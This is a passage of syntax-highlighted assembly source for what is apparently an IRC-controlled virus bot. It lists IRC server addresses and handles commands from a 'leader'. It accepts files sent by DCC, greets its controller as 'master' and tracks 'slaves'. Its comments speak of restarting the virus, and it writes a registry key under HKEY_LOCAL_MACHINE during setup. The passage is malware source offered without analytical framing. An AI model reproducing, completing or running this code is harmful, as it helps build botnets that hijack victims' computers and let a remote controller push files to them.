                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"194.159.80.19"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"128.138.129.31"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">; -------------- How to handle messages</span><span class="sc0">

  </span><span class="sc5">s_MessageParseData</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$0 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_RealStart</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

  </span><span class="sc5">s_RealStart</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 PRIVMSG"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$1 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc1">; split $1 at space until </span><span class="sc0">
                                                </span><span class="sc1">; two new strings is created</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_PrivMsgData</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 001"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; First message</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_StartCommands</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 303"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_IsOnMessage</span><span class="sc0">


</span><span class="sc1">; Low level commands</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 PING"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PONG $1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 433"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;GenerateNewNick</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 ERROR"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">s_ConnectFunction</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">; ------------------------------------ Handler of PRIVMSGs</span><span class="sc0">

  </span><span class="sc5">s_PrivMsgData</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$nick $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; messages from the leader</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_LeaderMessages</span><span class="sc0">


                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

  </span><span class="sc5">s_LeaderMessages</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 "</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc3">"DCC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; leader sends a file</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">; $3 = send or chat</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_DCCRecvProc</span><span class="sc0">           </span><span class="sc1">; $4 = additional data</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :Hello child"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 $leader :DCC script.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">; -------------------------------------------- DCC Handler</span><span class="sc0">
  </span><span class="sc5">s_DCCRecvProc</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"$3 SEND"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"f"</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">s_DCCRecvFunction</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">s_QuitFunction</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">; ------------------------------------ If leader is online</span><span class="sc0">
  </span><span class="sc5">s_IsOnMessage</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$1 $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG $leader :Hello master"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$1 $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">s_Restart</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">       
                        
  </span><span class="sc5">s_Restart</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; new leader is god</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$leader $god"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc1">; restart virus</span><span class="sc0">
</span><span class="sc1">; ----------------------- Commands to send when registered</span><span class="sc0">

  </span><span class="sc5">s_StartCommands</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; Check if leader is online, if virus = god</span><span class="sc0">
                                </span><span class="sc1">; then its not nessesary</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$mynick $god"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ISON $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">s_ListOfDownloadedFiles</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">s_End</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">StartIrcBot</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Random</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">RndMax</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">time</span><span class="sc4">:</span><span class="sc5">SYSTEMTIME</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RndMax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">time</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetLocalTime</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">time.wMilliseconds</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">time.wSecond</span><span class="sc0">

        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">time.wMinute</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">time.wHour</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">RandomNumber</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">RandomNumber</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">        

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoMod</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
     </span><span class="sc5">NoMod</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">        


</span><span class="sc5">UpdateScriptFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DataFilename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">



        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ScriptInMem</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ScriptFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetIpFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">gethostname</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">950</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">gethostbyname</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return</span><span class="sc0">   

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">htonl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">HostIpAddress</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc5">Return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">QuitFunction</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">Error</span><span class="sc0">

</span><span class="sc5">StringCmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Temp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NotEqualStrings</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">

   </span><span class="sc5">NotEqualStrings</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MyOpenFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
        
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">AsciiToNum</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">NumString</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">NumString</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

     </span><span class="sc5">CheckNextChar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">NoMore</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'9'</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">NoMore</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CheckNextChar</span><span class="sc0">

    </span><span class="sc5">NoMore</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">NumString</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

     </span><span class="sc5">CreateNumber</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CreateNumber</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">AsciiToNum</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">










</span><span class="sc5">lstrlenInc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">String</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">String</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">lstrlenInc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">LoadSlaveData</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">SlavePtr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SlavePtr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Slaves</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Slave1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumSlaves</span><span class="sc0">
     </span><span class="sc5">CopySlaveNames</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">


        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoComma</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">','</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
     </span><span class="sc5">NoComma</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CopySlaveNames</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">!</span><span class="sc4">=</span><span class="sc5">Slaves</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">LoadSlaveData</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">SetupProgram</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">FileHandle</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RegCreateKey</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegSubKey</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hKey</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">Error</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">600</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">300</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetCurrentDirectory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
